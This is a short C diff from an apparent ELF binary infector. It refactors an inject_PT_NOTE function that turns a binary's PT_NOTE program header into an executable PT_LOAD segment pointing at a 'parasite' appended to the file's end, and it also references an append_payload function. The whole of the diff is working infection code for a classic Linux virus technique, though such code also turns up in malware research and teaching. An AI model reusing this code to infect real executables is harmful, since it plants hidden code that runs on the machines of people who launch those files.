@@ -17,31 +17,25 @@ int inject_PT_NOTE(Elf64_Addr target_addr,
     Elf64_Addr correction;
     Elf64_Ehdr *ehdr = target_file->m_addr;
     assert(memcmp(ehdr, ELFMAG, SELFMAG) == 0);
-    for(size_t ph_index=0; ph_index < ehdr->e_phnum; ph_index++) {
-        Elf64_Phdr *phdr = (Elf64_Phdr *) ((char *) target_file->m_addr + ehdr->e_phoff
-            + ph_index*ehdr->e_phentsize);
-        if (phdr->p_type == PT_NOTE) {
-            printf("Found PT_NOTE in entry %d\n", ph_index);
-            phdr->p_type = PT_LOAD;
-            phdr->p_flags |= PF_X;
-            phdr->p_offset = target_file->m_sz; // parasite will be at the end
-            // one way of making target_addr congruent with offset mod page size
-            correction = phdr->p_offset % PAGE_SIZE - target_addr % PAGE_SIZE;
-            if (correction < 0)
-                correction += PAGE_SIZE;
-            phdr->p_paddr = phdr->p_vaddr = target_addr + correction;
-            phdr->p_filesz = phdr->p_memsz = target_sz;
-            target_segment->s_sz = phdr->p_filesz;
-            target_segment->s_offset = phdr->p_offset;
-            target_segment->s_addr = phdr->p_vaddr;
-            printf("Segment changed, offset: 0x%lx addr: 0x%lx, sz: 0x%lx\n",
-                   target_segment->s_offset, target_segment->s_addr,
+    Elf64_Phdr *phdr = get_phdr(PT_NOTE, target_file);
+    assert(phdr != NULL);
+    phdr->p_type = PT_LOAD;
+    phdr->p_flags |= (PF_X | PF_R);
+    phdr->p_offset = target_file->m_sz; // parasite will be at the end
+    // one way of making target_addr congruent with offset mod page size
+    correction = phdr->p_offset % PAGE_SIZE - target_addr % PAGE_SIZE;
+    if (correction < 0)
+        correction += PAGE_SIZE;
+    phdr->p_paddr = phdr->p_vaddr = target_addr + correction;
+    phdr->p_filesz = phdr->p_memsz = target_sz;
+    target_segment->s_sz = phdr->p_filesz;
+    target_segment->s_offset = phdr->p_offset;
+    target_segment->s_addr = phdr->p_vaddr;
+    printf("Segment changed, offset: 0x%lx addr: 0x%lx, sz: 0x%lx\n",
+    target_segment->s_offset, target_segment->s_addr,
                    target_segment->s_sz);
-            phdr->p_align = PAGE_SIZE;
-            return EXIT_SUCCESS;
-        }
-    }
-    return EXIT_FAILURE;
+    phdr->p_align = PAGE_SIZE;
+    return EXIT_SUCCESS;
 }
 
 int append_payload(char *target_filepath,
